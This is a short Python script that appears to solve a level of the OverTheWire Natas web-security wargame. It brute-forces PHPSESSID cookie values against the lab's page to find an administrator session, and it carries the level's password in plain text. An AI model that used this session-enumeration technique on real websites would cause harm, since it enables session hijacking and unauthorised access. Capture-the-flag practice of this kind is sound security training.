#!/usr/local/bin/python

import sys
import requests
import base64
import string
import time

#print "First argument is " + str(sys.argv[1])

url = 'http://natas18.natas.labs.overthewire.org/index.php?debug'

prx = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:8080',
}



#hdrs = {'Content-Type': 'application/x-www-form-urlencoded'}
cookies = {}
for i in range(0,641):
    cookies["PHPSESSID"] = str(i)
    r = requests.get(url, cookies=cookies, auth=('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'), proxies=prx)
    print i
    if "regular" in r.content:
        print "Regular"
    else:
        print "ADMIN SESSION"

#print resp.read()
